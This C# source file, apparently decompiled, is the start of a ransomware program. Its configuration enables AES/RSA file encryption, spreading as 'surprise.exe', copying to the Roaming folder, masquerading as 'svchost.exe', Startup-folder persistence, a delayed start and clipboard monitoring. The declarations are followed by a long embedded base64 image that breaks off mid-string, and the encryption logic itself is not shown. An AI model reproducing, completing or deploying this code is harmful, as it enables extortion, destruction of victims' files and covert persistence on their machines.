using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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